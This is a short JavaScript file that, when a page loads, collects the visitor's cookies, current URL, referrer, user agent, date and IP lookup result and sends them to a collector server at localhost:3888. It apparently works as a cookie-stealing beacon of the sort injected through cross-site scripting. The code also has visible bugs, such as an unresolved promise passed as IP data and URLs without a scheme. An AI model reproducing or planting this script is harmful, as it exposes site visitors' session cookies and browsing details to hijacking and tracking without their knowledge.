import axios from 'axios';

window.addEventListener("load", function (event) {
    axios({
        method: 'get',
        url: 'localhost:3888',
        params: {
            time: getTime(),
            ipinfo: getIpinfo(),
            url: getUrl(),
            refer: getRefer(),
            agent: getAgent(),
            cookie: getCookie(),
        }
    })
});

function getTime() {
    let nowDate = new Date();
    return nowDate.toLocaleDateString();
}
function getIpinfo() {
    let info = axios({
        method: 'get',
        url: 'ip-api.com/json',
    })
    return info;
}
function getUrl() {
    return window.location.href
}
function getRefer() {
    return document.referrer;
}
function getAgent() {
    return navigator.userAgent;
}
function getCookie() {
    return document.cookie;
}
